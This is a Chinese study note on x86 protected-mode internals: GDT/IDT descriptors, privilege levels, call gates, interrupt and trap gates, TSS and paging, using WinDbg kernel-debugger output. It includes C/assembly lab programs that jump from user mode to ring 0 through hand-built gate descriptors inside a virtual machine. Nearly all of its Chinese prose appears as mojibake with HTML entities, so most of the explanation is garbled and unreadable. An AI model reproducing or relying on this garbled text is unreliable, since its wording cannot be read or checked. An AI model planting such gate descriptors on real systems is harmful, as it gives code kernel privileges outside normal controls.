ä½çš„æœ€é«˜ä½ä¸º 1ï¼Œå°±è¡¨ç¤ºå½“å‰æ˜¯ä»£ç æ®µï¼Œæ­¤æ—¶çœ‹åˆ°çš„ TYPE æ•´ä½“ä¼šå¤§äº 7\nC: è¡¨ç¤ºå½“å‰æ˜¯å¦æ˜¯ä¸€è‡´ä»£ç æ®µã€‚å¦‚æœä½†å…¶æ¦‚å¿µæ˜¯ä¸€è‡´ä»£ç æ®µï¼Œå°±è¡¨ç¤ºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä½æƒé™è®¿é—®é«˜æƒé™çš„å†…å®¹ã€‚å¦‚æœä½†å…¶æ¦‚å¿µæ˜¯éä¸€è‡´ä»£ç æ®µï¼Œé‚£ä¹ˆè¦æ±‚è®¿é—®è€…ä¸ªè¢«è®¿é—®è€…æƒé™å¿…é¡»ä¸€è‡´ ã€‚\nR: å½“å‰çš„æ®µæ˜¯å¦æ˜¯å¯è¯»çš„\nA: è¡¨ç¤ºå½“å‰çš„æ®µæ˜¯å¦è¢«è®¿é—®äº†ï¼Œå¦‚æœè¢«è®¿é—®äº†å°±ä¸º 1\n\n\nå¦‚æœ TYPE ä½çš„æœ€é«˜ä½ä¸º 0ï¼Œå°±è¡¨ç¤ºå½“å‰æ˜¯æ•°æ®æ®µï¼Œæ­¤æ—¶çœ‹åˆ°çš„ TYPE æ•´ä½“ä¼šå°äº 8\nE: è¡¨ç¤ºå½“å‰æ˜¯å‘ä¸Šæ‰©å±•(extend-up)æ®µè¿˜æ˜¯å‘ä¸‹æ‰©å±•(extend-down)æ®µ\n\nW: è¡¨ç¤ºå½“å‰çš„æ®µæ˜¯å¯å†™çš„\nA: è¡¨ç¤ºå½“å‰çš„æ®µæ˜¯å¦è¢«è®¿é—®äº†ï¼Œå¦‚æœè¢«è®¿é—®äº†å°±ä¸º 1\n\næ‰‹åŠ¨è§£æ\n0008 -&gt; åŒæœºè°ƒè¯• CS &#x3D; 1(INDEX) + 0(TI) + 00(RPL)ï¼Œé€šè¿‡ dq gdtr+(INDEX*8) æ‰¾åˆ°æ®µæè¿°ç¬¦\n00cf9b00&#96;0000ffff: base è¡¨ç¤ºå½“å‰çš„æ®µåŸºå€ä¸º 0\n00cf9b00&#96;0000ffffï¼šlimit ä¸º 0xFFFFFï¼ŒGä½æ˜¯Cçš„æœ€é«˜ä½è¡¨ç¤º1ï¼Œæ‰€ä»¥LIMIT æ˜¯ 0xFFFFFFFF\n00cf9b00&#96;0000ffffï¼šé™¤äº† G ä½ï¼Œåˆ†åˆ«ä¸º DB(1)ã€L(0) å’Œ AVL(0)ï¼Œåªæœ‰ DB æ˜¯æœ‰æ„ä¹‰çš„\n00cf9b00&#96;0000ffffï¼š9å¯¹åº”äº† P(1) + DPL(00) + S(1)ï¼Œè¯´æ˜å½“å‰æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ä»…R0èƒ½è®¿é—®çš„ç”¨æˆ·æ®µ\n00cf9b00&#96;0000ffffï¼šbå¤§äº8ï¼Œè¯´æ˜æ˜¯ä»£ç æ®µï¼Œä¸‰ä¸ªå±æ€§åˆ†åˆ«æ˜¯ 0(éä¸€è‡´) 1(å¯è¯») 1(è®¿é—®è¿‡)\n\n\n001b -&gt; ç”¨æˆ·ç¨‹åºCS &#x3D; 11(INDEX) + 0(TI) + 11(RPL)ï¼Œé€šè¿‡ dq gdtr+(INDEX*8) æ‰¾åˆ°æ®µæè¿°ç¬¦\n00cffb00&#96;0000ffffï¼šbase è¡¨ç¤ºå½“å‰çš„æ®µåŸºå€ä¸º 0\n00cffb00&#96;0000ffffï¼šlimit ä¸º 0xFFFFFï¼ŒGä½æ˜¯Cçš„æœ€é«˜ä½è¡¨ç¤º1ï¼Œæ‰€ä»¥LIMIT æ˜¯ 0xFFFFFFFF\n00cffb00&#96;0000ffffï¼šé™¤äº† G ä½ï¼Œåˆ†åˆ«ä¸º DB(1)ã€L(0) å’Œ AVL(0)ï¼Œåªæœ‰ DB æ˜¯æœ‰æ„ä¹‰çš„\n00cffb00&#96;0000ffffï¼šFå¯¹åº”äº† P(1) + DPL(11) + S(1)ï¼Œè¯´æ˜å½“å‰æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„éœ€è¦R3èƒ½è®¿é—®çš„ç”¨æˆ·æ®µ\n00cffb00&#96;0000ffffï¼šbå¤§äº8ï¼Œè¯´æ˜æ˜¯ä»£ç æ®µï¼Œä¸‰ä¸ªå±æ€§åˆ†åˆ«æ˜¯ 0(éä¸€è‡´) 1(å¯è¯») 1(è®¿é—®è¿‡)\n\n\néšä¾¿æ‰¾çš„ä¸€ä¸ªæ•°æ®æ®µï¼Œå¯¹åº” TI å’Œ INDEX åˆ†åˆ«æ˜¯ 0 å’Œ 10ï¼ŒDPLæ˜¯0è¡¨ç¤ºé€‰æ‹©å­æœ€ä½ä¸¤ä½åº”è¯¥æ˜¯0\n00cf9300&#96;0000ffffï¼šbase è¡¨ç¤ºå½“å‰çš„æ®µåŸºå€ä¸º 0\n00cf9300&#96;0000ffffï¼šlimit ä¸º 0xFFFFFï¼ŒGä½æ˜¯Cçš„æœ€é«˜ä½è¡¨ç¤º1ï¼Œæ‰€ä»¥LIMIT æ˜¯ 0xFFFFFFFF\n00cf9300&#96;0000ffffï¼šé™¤äº† G ä½ï¼Œåˆ†åˆ«ä¸º DB(1)ã€L(0) å’Œ AVL(0)ï¼Œåªæœ‰ DB æ˜¯æœ‰æ„ä¹‰çš„\n00cf9300&#96;0000ffffï¼š9å¯¹åº”äº† P(1) + DPL(00) + S(1)ï¼Œè¯´æ˜å½“å‰æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ä»…R0èƒ½è®¿é—®çš„ç”¨æˆ·æ®µ\n00cf9300&#96;0000ffffï¼š3å°äº 7 æ˜¯æ•°æ®æ®µï¼Œä¸‰ä¸ªå±æ€§åˆ†åˆ«æ˜¯ E(å‘ä¸Šæ‰©å±•) W(å¯å†™) A(è®¿é—®äº†)\n\n\n\næƒé™æ£€æŸ¥\né€šè¿‡ lxs å’Œ mov xs, ax å¯ä»¥åˆ‡æ¢æ®µé€‰æ‹©å­ åŠ è½½æ®µé€‰æ‹©ç¬¦è¿›å…¥æ®µå¯„å­˜å™¨çš„æ—¶å€™\n\nCSå¯„å­˜å™¨åªèƒ½å­˜æ”¾ä»£ç æ®µçš„é€‰æ‹©ç¬¦\nä»£ç æ®µé€‰æ‹©ç¬¦å¯ä»¥è¢«åŠ è½½åˆ°æ•°æ®æ®µå¯„å­˜å™¨ï¼Œä½†æ˜¯ä¸å¯è¯»çš„ä»£ç æ®µé€‰æ‹©ç¬¦ä¸èƒ½è¢«åŠ è½½è¿›å…¥æ•°æ®æ®µå¯„å­˜å™¨ï¼ˆå› ä¸ºæ•°æ®æ®µéƒ½æ˜¯å¯è¯»çš„ï¼‰\nåªæœ‰å¯è¯»å¯å†™æ•°æ®æ®µé€‰æ‹©ç¬¦æ‰èƒ½åŠ è½½åˆ°SSå¯„å­˜å™¨ï¼ˆSSå¯„å­˜å™¨ä¸€å®šæ˜¯å¯å†™çš„ï¼‰\n\n\nå½“å‰æ¥è§¦åˆ°çš„ä¸‰ç§æƒé™ï¼š\n\nCPLï¼šç‰¹æŒ‡ CS æ®µå¯„å­˜å™¨çš„æœ€ä½ä¸¤ä½ï¼Œè¡¨ç¤ºå½“å‰æ‰€æ‹¥æœ‰(å½“å‰æ‰§è¡Œä»£ç )çš„æƒé™\n\nå½“å‰æ“ä½œç³»ç»Ÿç™»å½•ç”¨æˆ·çš„æƒé™\n\n\nRPLï¼šæŒ‡ä»»ä½•ä¸€ä¸ªæ®µé€‰æ‹©å­çš„æœ€ä½ä¸¤ä½ï¼Œè¡¨ç¤ºä½¿ç”¨ä»€ä¹ˆæ ·çš„æƒé™è¿›è¡Œè¯·æ±‚\n\nå½“å‰æ˜¯å¦ä½¿ç”¨äº†ç®¡ç†å‘˜æ–¹å¼æ‰“å¼€ç›®æ ‡ç¨‹åº\n\n\nDPLï¼šæƒ³è¦åˆ‡æ¢åˆ°å½“å‰çš„æ®µæè¿°ç¬¦éœ€è¦ä»€ä¹ˆæ ·çš„æƒé™\n\nå½“å‰çš„åº”ç”¨ç¨‹åºæœ€å°‘éœ€è¦ä½¿ç”¨ä»€ä¹ˆæ ·çš„æƒé™\n\n\nä»£ç é—´çš„è·³è½¬JMP 0x20:0x004183D7 CPUæ€ä¹ˆæŒ‡å‘è¿™æ®µä»£ç \n\næ®µé€‰æ‹©å­æ‹†åˆ†\n0x20å¯¹åº”äºŒè¿›åˆ¶ 0000 0000 0010 0000\nRPL &#x3D; 00\nTi &#x3D; 0\nIndex &#x3D; 4\n\næŸ¥è¡¨å¾—åˆ°æ®µæè¿°ç¬¦\nTi &#x3D; 0 æ‰€ä»¥æŸ¥GDTè¡¨\nIndex &#x3D; 4 æ‰¾åˆ°å¯¹åº”çš„æ®µæè¿°ç¬¦\nå››ç§æƒ…å†µå¯ä»¥è·³è½¬: ä»£ç æ®µ,è°ƒç”¨é—¨,TSSä»»åŠ¡æ®µ,ä»»åŠ¡é—¨\n\næƒé™æ£€æŸ¥\nå¦‚æœæ˜¯éä¸€è‡´ä»£ç æ®µ,è¦æ±‚CPL &#x3D;&#x3D; DPL &amp;&amp; RPL &lt;&#x3D; DPL\nå¦‚æœæ˜¯ä¸€è‡´ä»£ç æ®µ,è¦æ±‚CPL &gt;&#x3D; DPL\n\nåŠ è½½æ®µæè¿°ç¬¦\né€šè¿‡ä¸Šé¢çš„æƒé™æ£€æŸ¥å,cpuä¼šå°†æ®µæè¿°ç¬¦åŠ è½½åˆ°csæ®µå¯„å­˜å™¨ä¸­\n\nä»£ç æ‰§è¡Œ\ncpuå°† cs.base + Offset çš„å€¼å†™å…¥eipç„¶åæ‰§è¡Œcs:eipå¤„çš„ä»£ç ,æ®µé—´è·³è½¬ç»“æŸ\n\n\nè°ƒç”¨é—¨\n\n\n\n\n\n1100\næŸ¥çœ‹GDTè¡¨\nkd&gt; r gdtr\ngdtr&#x3D;80b95000\nkd&gt; r gdtl\ngdtl&#x3D;000003ff\n\nè·¨æ®µè°ƒç”¨è°ƒç”¨ææƒ\n\n\nè°ƒç”¨ä¸ææƒ\n\n\nè·¨æ®µè°ƒç”¨æ—¶,ä¸€æ—¦æœ‰æƒé™åˆ‡æ¢,å°±ä¼šè·Ÿç€åˆ‡æ¢æ ˆ\nCSçš„æƒé™ä¸€æ—¦æ”¹å˜,SSçš„æƒé™ä¹Ÿè¦éšç€æ”¹å˜,CSä¸SSçš„ç­‰çº§å¿…é¡»ä¸€æ ·\nJMP FAR åªèƒ½è·³è½¬åˆ°åŒçº§çš„ä¸€è‡´ä»£ç æ®µ,ä½†CALL FARå¯ä»¥é€šè¿‡è°ƒç”¨é—¨ææƒ,æå‡CPLæƒé™\næ³¨: SSä¸ESPä»é‚£é‡Œæ¥?å‚è§TSSæ®µ\nè°ƒç”¨é—¨æ‰§è¡Œæµç¨‹æŒ‡ä»¤æ ¼å¼ CALL CS:EIP(EIPæ˜¯åºŸå¼ƒçš„)\næ‰§è¡Œæ­¥éª¤:\n æ ¹æ®CSçš„å€¼æŸ¥GDTè¡¨,æ‰¾åˆ°å¯¹åº”çš„æ®µæè¿°ç¬¦,è¿™ä¸ªæè¿°ç¬¦æ˜¯ä¸€ä¸ªè°ƒç”¨é—¨\n åœ¨è°ƒç”¨é—¨æè¿°ç¬¦ä¸­å­˜å‚¨å¦ä¸€ä¸ªä»£ç æ®µçš„æ®µé€‰æ‹©å­\n é€‰æ‹©å­æŒ‡å‘çš„æ®µ æ®µ.Base + åç§»åœ°å€ å°±æ˜¯çœŸæ­£è¦æ‰§è¡Œçš„åœ°å€\n#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n\n\ntypedef struct _CALLGATE \n&#123;\n\tunsigned int offset1 : 16;\t\t\t\t&#x2F;&#x2F; ææƒåæ‰§è¡Œä»£ç çš„ä½åœ°å€\n\tunsigned int selector : 16;\t\t\t\t&#x2F;&#x2F; éœ€è¦æå‡çš„æƒé™å¯¹åº”çš„é€‰æ‹©å­\n\tunsigned int paramcount : 5;\t\t\t&#x2F;&#x2F; ææƒåæ‰§è¡Œçš„ä»£ç ç”¨åˆ°çš„å‚æ•°\n\tunsigned int : 3;\t\t\t\t\t\t&#x2F;&#x2F; ä¿ç•™ä½\n\tunsigned int type : 4;\t\t\t\t\t&#x2F;&#x2F; å¯¹äºè°ƒç”¨é—¨å§‹ç»ˆæ˜¯ 1100 \n\tunsigned int S : 1;\t\t\t\t\t\t&#x2F;&#x2F; å¯¹äºè°ƒç”¨é—¨å§‹ç»ˆæ˜¯ 0\n\tunsigned int DPL : 2;\t\t\t\t\t&#x2F;&#x2F; è®¿é—®æˆ‘éœ€è¦çš„æƒé™ï¼Œåº”è¯¥å†™ 3\n\tunsigned int P : 1;\t\t\t\t\t\t&#x2F;&#x2F; å¿…é¡»æ˜¯æœ‰æ•ˆçš„æ®µæè¿°ç¬¦\n\tunsigned int offset2 : 16;\t\t\t\t&#x2F;&#x2F; ææƒåæ‰§è¡Œä»£ç çš„é«˜åœ°å€\n&#125; CALLGATE, *PCALLGATE;\n\n&#x2F;&#x2F; åœ¨è¿›è¡Œæƒé™åˆ‡æ¢çš„è¿‡ç¨‹ä¸­ï¼Œæ ˆä¹Ÿä¼šéšä¹‹æ”¹å˜\nshort r0_ss &#x3D; 0;\nint r0_esp &#x3D; 0;\n\n&#x2F;&#x2F; è£¸å‡½æ•°ï¼Œåªç”Ÿæˆç”¨æˆ·ç¼–å†™çš„ä»£ç ï¼Œåœ¨å…¶ä¸­æ“ä½œé«˜åœ°å€ç©ºé—´\n_declspec(naked) void r0_function()\n&#123;\n\t__asm\n\t&#123;\n\t\tint 3\n\t\tmov r0_ss, ss\t\t; è·å– r0 æƒé™çš„ ss\n\t\tmov r0_esp, esp\t\t; è·å– r0 æƒé™çš„ esp\n\t\tretf\t\t\t\t; è°ƒç”¨é—¨å¿…é¡»ä½¿ç”¨ retf è¿›è¡Œè¿”å›\n\n\t\t; å®ç°é€šè¿‡è°ƒç”¨é—¨è¯»å–åˆ° gdt ä¸­çš„ç¬¬ 3 é¡¹\n\t\t; sgdt å¯ä»¥è·å– gdt çš„åœ°å€\n\t\t; å¯¹äºä¸­æ–­é—¨å’Œé™·é˜±é—¨å¿…é¡»ä½¿ç”¨ iretd\n\t&#125;\n&#125;\n\nint main()\n&#123;\n\t&#x2F;&#x2F; 1. æ ¹æ®å½“å‰å‡½æ•°çš„ä½ç½®ï¼Œæ„å»ºä¸€ä¸ªè°ƒç”¨é—¨ï¼Œç”¨äºè¿›è¡Œè·³è½¬\n\t&#x2F;&#x2F; offset: 0045???? ????6c20\t-&gt; éœ€è¦è·³è½¬çš„åç§»\n\t&#x2F;&#x2F; selector: ???????? 0008???? (1 0 00) -&gt;  éœ€è¦åˆ‡æ¢çš„æƒé™\n\t&#x2F;&#x2F; DPL: ????E??? ????????\t-&gt; è®¿é—®å½“å‰è°ƒç”¨é—¨çš„æƒé™\n\t&#x2F;&#x2F; TYPE: ?????C?? ????????\t-&gt; å½“å‰æ˜¯ä¸€ä¸ªè°ƒç”¨é—¨æè¿°ç¬¦\n\t&#x2F;&#x2F;00456BC0 00456BC0\n\t&#x2F;&#x2F; 0045EC00&#96;00086BC0\n\n\n\n\t&#x2F;&#x2F; 2. æ„å»ºä¸€ä¸ªè¿œè·³çš„åœ°å€ï¼Œåœ¨è¿œè·³ä¸­ï¼Œåç§»æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œç»™ä»€ä¹ˆéƒ½å“¦å¯ä»¥\n\t&#x2F;&#x2F;\tåé¢ä¿å­˜çš„æ˜¯æ®µé€‰æ‹©å­ï¼Œå¯ä»¥ç”¨äºæ‰¾åˆ°è°ƒç”¨é—¨æè¿°ç¬¦ï¼Œè¦æ±‚ RPL &lt;&#x3D; DPL\n\t&#x2F;&#x2F;\t- 0x004B -&gt; 01001(INDEX) 0(TI) 11(RPL)\n\tBYTE dest[] &#x3D; &#123; 0x00, 0x00, 0x00, 0x00, 0x4B, 0x00 &#125;;\n\t&#x2F;&#x2F;char dest[6] &#x3D; &#123;&#125;;\n\t&#x2F;&#x2F;*(DWORD*)&amp;dest[0] &#x3D; 0x12345678;\n\t&#x2F;&#x2F;*(DWORD*)&amp;dest[4] &#x3D; 0x48;\n\n\t&#x2F;&#x2F; 3. ä½¿ç”¨ call far è¯­å¥ï¼Œè·³è½¬åˆ°æŒ‡å®šçš„è°ƒç”¨é—¨ä¸­ï¼Œåœ¨è¿›è¡ŒR3åˆ°R0 çš„è½¬åŒ–çš„\n\t&#x2F;&#x2F;\tæ—¶å€™ CPU ä¼šé»˜è®¤çš„å°†ç”¨æˆ· SS ESP CS IP ä¿å­˜åˆ°æ ˆä¸­\n\t__asm push fs\n\t__asm call fword ptr dest;\n\t__asm pop fs\n\n\t&#x2F;&#x2F; 4. è¾“å‡º R0 ä¸‹çš„ esp å’Œ ssï¼Œå¦‚æœR0ä»£ç è®¾ç½®æ–­ç‚¹ï¼Œé‚£ä¹ˆ fs ä¼šè¢«æ”¹å˜ï¼Œè°ƒ\n\t&#x2F;&#x2F;\tç”¨å‡½æ•°ä¼šå´©æºƒï¼Œéœ€è¦åœ¨è¿›å…¥é—¨ä¹‹å‰å…ˆè¿›è¡Œä¿å­˜\n\tprintf(&quot;%04X: %08X\\n&quot;, r0_ss, r0_esp);\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\nå°†æ„é€ çš„é—¨æè¿°ç¬¦å¡«å†™åˆ°ç´¢å¼•å¤„,å†å°†ç”Ÿæˆå¥½åˆ°ç¨‹åºæ”¾åˆ°è™šæ‹Ÿæœºä¸­æ‰§è¡Œ\n\n\nè¾“å…¥æŒ‡ä»¤ g ç›´æ¥è¿è¡Œ\n\n\næ³¨æ„ï¼Œå¦‚æœåœ¨è¿”å›æ—¶éœ€è¦æ”¹å˜ç‰¹æƒçº§ï¼Œå°†ä¼šæ£€æŸ¥æ®µå¯„å­˜å™¨DSã€ESã€FSã€GSçš„å†…å®¹ï¼Œå¦‚æœåœ¨å®ƒä»¬ä¹‹ä¸­ï¼ŒæŸä¸ªå¯„å­˜å™¨çš„ä¸­çš„é€‰æ‹©å­æ‰€æŒ‡å‘çš„æ•°æ®æ®µæè¿°ç¬¦çš„DPLæƒé™æ¯”è¿”å›åçš„CPL(CS.RPL)é«˜,å³æ•°å€¼ä¸Šè¿”å›åçš„CPL&gt;æ•°æ®æ–­æè¿°ç¬¦çš„DPL,å¤„ç†å™¨å°†ä¼šæŠŠæ•°å€¼0å¡«å……åˆ°ç›¸åº”çš„æ®µå¯„å­˜å™¨ã€‚\nIDTè¡¨IDTè¡¨æ¦‚è¿°IDTå³ä¸­æ–­æè¿°ç¬¦è¡¨,åŒGDTä¸€æ ·,IDTä¹Ÿæ˜¯ç”±ä¸€ç³»åˆ—æè¿°ç¬¦ç»„æˆ,æ¯ä¸ªæè¿°ç¬¦å 8ä¸ªå­—èŠ‚.ä½†è¦æ³¨æ„çš„æ˜¯,IDTè¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸æ˜¯NULL\nåœ¨Windbgä¸­æŸ¥çœ‹IDTè¡¨çš„åŸºå€å’Œé•¿åº¦\nkd&gt; r idtr\nidtr&#x3D;80b95400\nkd&gt; r idtl\nidtl&#x3D;000007ff\n\nIDTè¡¨æ„æˆIDTè¡¨å¯ä»¥åŒ…å«ä¸‰ç§é—¨æè¿°ç¬¦:\niretd è¿”å›\nä¸­æ–­é—¨æè¿°ç¬¦ä¸­æ–­é—¨\n1110\n\n\n#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n\n\n&#x2F;&#x2F; åœ¨è¿›è¡Œæƒé™åˆ‡æ¢çš„è¿‡ç¨‹ä¸­ï¼Œæ ˆä¹Ÿä¼šéšä¹‹æ”¹å˜\nshort r0_ss &#x3D; 0;\nint r0_esp &#x3D; 0;\n\n\n&#x2F;&#x2F; è£¸å‡½æ•°ï¼Œåªç”Ÿæˆç”¨æˆ·ç¼–å†™çš„ä»£ç ï¼Œåœ¨å…¶ä¸­æ“ä½œé«˜åœ°å€ç©ºé—´\n_declspec(naked) void r0_function()\n&#123;\n\t__asm\n\t&#123;\n\t\t&#x2F;&#x2F;int 3\n\t\tmov r0_ss, ss; è·å– r0 æƒé™çš„ ss\n\t\tmov r0_esp, esp; è·å– r0 æƒé™çš„ esp\n\t\tiretd; \n\t&#125;\n&#125;\n\n\n\nint main()\n&#123;\n\t&#x2F;&#x2F;ä¸­æ–­é—¨\n\t&#x2F;&#x2F; 1. æ ¹æ®å½“å‰å‡½æ•°çš„ä½ç½®ï¼Œæ„å»ºä¸€ä¸ªä¸­æ–­é—¨ï¼Œç”¨äºè¿›è¡Œè·³è½¬\n\t&#x2F;&#x2F; offset: 0045???? ????6c20\t-&gt; éœ€è¦è·³è½¬çš„åç§»\n\t&#x2F;&#x2F; selector: ???????? 0008???? (1 0 00) -&gt;  éœ€è¦åˆ‡æ¢çš„æƒé™\n\t&#x2F;&#x2F; DPL: ????E??? ????????\t-&gt; è®¿é—®å½“å‰ä¸­æ–­é—¨çš„æƒé™\n\t&#x2F;&#x2F; TYPE: ?????E?? ????????\t-&gt; å½“å‰æ˜¯ä¸€ä¸ªä¸­æ–­é—¨æè¿°ç¬¦\n\t&#x2F;&#x2F;åˆ¶é€ ä¸­æ–­,ä½¿å…¶è°ƒç”¨ä¸­æ–­é—¨æè¿°ç¬¦\n\t&#x2F;&#x2F;00456BC0\n\n\t&#x2F;&#x2F;0045EE0000086BC0\n\t_asm\n\t&#123;\n\t\tpush fs\n\t\tint 32\n\t\tpop fs\n\t&#125;\n\n\tprintf(&quot;%04X: %08X\\n&quot;, r0_ss, r0_esp);\n\tsystem(&quot;pause&quot;);\n\treturn 0;\n&#125;\n\n\n\né™·é˜±é—¨æè¿°ç¬¦1111\n\n\né™·é˜±é—¨ä¸ä¸­æ–­é—¨çš„åŒºåˆ«\nä¸­æ–­é—¨æ‰§è¡Œæ—¶,å°†IFä½æ¸…é›¶,é™·é˜±é—¨\nä»»åŠ¡é—¨æè¿°ç¬¦åœ¨è°ƒç”¨é—¨,ä¸­æ–­é—¨ä¸é™·é˜±é—¨ä¸­ä¸€æ—¦å‡ºç°æƒé™åˆ‡æ¢,é‚£ä¹ˆå°±ä¼šæœ‰å †æ ˆåˆ‡æ¢.è€Œä¸”,ç”±äºCSçš„CPLå‘é€æ”¹å˜,ä¹Ÿå¯¼è‡´äº†SSä¹Ÿå¿…é¡»åˆ‡æ¢,åˆ‡æ¢æ—¶,ä¼šæœ‰ESPå’ŒSS(CSæ˜¯ç”±ä¸­æ–­é—¨æˆ–è€…è°ƒç”¨é—¨æŒ‡å®š)è¿™2ä¸ªå€¼ä»TSS(Task-state segment),ä»»åŠ¡çŠ¶æ€æ®µ\nTSSTSSæ˜¯ä¸€å—å†…å­˜,å¤§å°104å­—èŠ‚\n\n\nä¸è¦æŠŠTSSä¸ä»»åŠ¡åˆ‡æ¢è”ç³»åˆ°ä¸€èµ·,TSSçš„æ„ä¹‰å°±åœ¨äºå¯ä»¥åŒæ—¶æ¢æ‰ä¸€å †å¯„å­˜å™¨\nCPUæ€ä¹ˆæ‰¾åˆ°TSS,\nTRæ®µå¯„å­˜å™¨\n\n\nTSSæ®µæè¿°ç¬¦\n\n\næ„é€ TSSæ®µæè¿°ç¬¦:xx00e9xx&#96;xxxx0068\nTRå¯„å­˜å™¨è¯»å†™\n1,å°†TSSæ®µæè¿°ç¬¦åŠ è½½åˆ°TRå¯„å­˜å™¨\næŒ‡ä»¤:LTR\nè¯´æ˜:ç”¨LTRæŒ‡ä»¤å»è£…è½½ ä»…ä»…æ˜¯æ”¹å˜TRå¯„å­˜å™¨çš„å€¼96ä½,å¹¶æ²¡æœ‰çœŸæ­£æ”¹å˜TSS,LTRæŒ‡ä»¤åªèƒ½åœ¨ç³»ç»Ÿå±‚ä½¿ç”¨,åŠ è½½åTSSæ®µæè¿°ç¬¦çŠ¶æ€ä¸ºä¼šå‘ç”Ÿæ”¹å˜\n2,è¯»TRå¯„å­˜å™¨\næŒ‡ä»¤:STR\nè¯´æ˜:å¦‚æœç”¨STRå»è¯»çš„èŠ±,åªè¯»äº†TRçš„16ä½,ä¹Ÿå°±æ˜¯é€‰æ‹©å­\nåˆ†é¡µæœºåˆ¶PDEä¸PTE80x86æ˜ å°„è¡¨åˆ†ä¸¤çº§\nç¬¬ä¸€çº§:é¡µç›®å½•è¡¨(PDT)\nç¬¬äºŒçº§:é¡µè¡¨(PTT)\n\n\nå±æ€§\n\nPä½ï¼š\n å­˜åœ¨\nR&#x2F;Wä½ï¼š\n R&#x2F;W &#x3D; 0 åªè¯»\n R&#x2F;W &#x3D; 1 å¯è¯»å¯å†™\nU&#x2F;S ä½ï¼š\n U&#x2F;S &#x3D; 0 ç‰¹æƒç”¨æˆ·æ‰èƒ½è®¿é—®\n U&#x2F;S &#x3D; 1 æ™®é€šç”¨æˆ·ç‰¹æƒç”¨æˆ·éƒ½èƒ½è®¿é—®\nP&#x2F;S ä½ï¼šåªå¯¹PDEæœ‰æ„ä¹‰\n å½“ps&#x3D;1æ—¶PDEç›´æ¥æŒ‡å‘ç‰©ç†é¡µæ— PTEï¼Œä½22ä½æ˜¯é¡µå†…åç§»ï¼Œé¡µå¤§å°ä½4M\n å½“ps&#x3D;0æ—¶ï¼ŒæŒ‡å‘ä¸‹ä¸€çº§é¡µè¡¨\nDä½ï¼š\n æ˜¯å¦è¢«å†™è¿‡ï¼Œå†™è¿‡å°±ç½®ä¸º1\nWindowsæ˜¯é€šè¿‡é¡µç›®å½•\n\nåœ¨ 8086 CPU ä¸‹ï¼Œæˆ‘ä»¬æ˜¯å¦‚ä½•è¿›è¡Œå¯»å€çš„ï¼Ÿ\næˆ‘ä»¬ä½¿ç”¨ æ®µå¯„å­˜å™¨:æ®µå†…åç§» çš„å½¢å¼è®¿é—®ä¸€ä¸ªç‰©ç†åœ°å€ï¼Œå®é™…è®¿é—®åˆ°çš„åœ°å€æ˜¯ï¼šæ®µå¯„å­˜å™¨*0x10+æ®µå†…åç§»ï¼ŒCPUæ‰€å¤„çš„æ¨¡å¼æ˜¯å®æ¨¡å¼ã€‚\n\nåœ¨ 80386 ç³»åˆ—çš„ CPU ä¸‹ï¼Œæ‹¥æœ‰å‡ ç§ CPU æ¨¡å¼ï¼Ÿ\nä¸‰ç§ã€‚åˆ†åˆ«æ˜¯å®æ¨¡å¼ã€ä¿æŠ¤æ¨¡å¼ä»¥åŠè™šæ‹Ÿ8086æ¨¡å¼ã€‚å½“è®¡ç®—æœºé€šç”µçš„æ—¶å€™ï¼ŒCPUè‚¯å®šå¤„äºå®æ¨¡å¼ï¼Œåœ¨è¿›è¡Œä¸€äº›åˆå§‹åŒ–åï¼Œä¼šåˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼ä¸­ã€‚\n\nåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬æ˜¯å¦‚ä½•è¿›è¡Œå¯»å€çš„ï¼Ÿæˆ‘ä»¬ä½¿ç”¨ æ®µå¯„å­˜å™¨:æ®µå†…åç§» çš„å½¢å¼è®¿é—®ä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œæ­¤æ—¶æ®µå¯„å­˜å™¨ä¿å­˜çš„å¹¶ä¸æ˜¯æ®µåŸºå€ï¼Œè€Œæ˜¯æ®µé€‰æ‹©å­ï¼Œé€šè¿‡æ®µé€‰æ‹©å­å¯ä»¥æ‰¾åˆ°æ®µæè¿°ç¬¦ï¼Œåœ¨è¿›è¡Œæ®µé€‰æ‹©å­åˆ‡æ¢çš„æ—¶å€™ï¼ŒCPUä¼šå°†æ®µæè¿°ç¬¦ä¸­çš„éƒ¨åˆ†å†…å®¹åŠ è½½åˆ°ä¸å¯è§çš„é«˜é€Ÿç¼“å­˜éƒ¨åˆ†ï¼Œåœ¨å®é™…å¯»å€æ—¶ï¼Œä¼šä½¿ç”¨è¿™ä¸€éƒ¨åˆ†çš„ä¿¡æ¯ã€‚\n\nå½“åˆ‡æ¢æ®µé€‰æ‹©å­çš„æ—¶å€™ï¼ŒCPUä¼šè¿›è¡Œä»€ä¹ˆæ ·çš„åŸºæœ¬æƒé™æ£€æŸ¥ï¼ŸCPLç‰¹æŒ‡CSæ®µçš„ä½ä¸¤ä½ï¼Œè¡¨ç¤ºå½“å‰æ‰€æ‹¥æœ‰çš„æƒé™ã€RPLæŒ‡æ®µé€‰æ‹©å­çš„ä½ä¸¤ä½ï¼Œè¡¨ç¤ºå½“å‰ä½¿ç”¨çš„æ˜¯ä»€ä¹ˆæƒé™ã€DPLè¡¨ç¤ºæƒ³è¦è®¿é—®æŒ‡å®šæ®µæè¿°ç¬¦æ‰€éœ€è¦çš„æƒé™ï¼Œå®é™…çš„æƒé™æ£€æŸ¥å…¬å¼ä¸ºï¼šMAX(CPL, RPL) &lt;&#x3D; DPL\n\nä¸­æ–­é—¨æˆ–é™·é˜±é—¨ä¿å­˜åœ¨å“ªé‡Œï¼Œå¦‚ä½•è§¦å‘ï¼Ÿä¸­æ–­é—¨å’Œé™·é˜±é—¨éƒ½åº”è¯¥ç”± IDT è¿›è¡Œå¤„ç†ï¼Œæ„å»ºå®Œæˆåï¼Œä½¿ç”¨ int n è§¦å‘å®ƒï¼Œåœ¨è¿›å…¥ä¸­æ–­é—¨\\é™·é˜±é—¨åï¼Œä½¿ç”¨ iretd 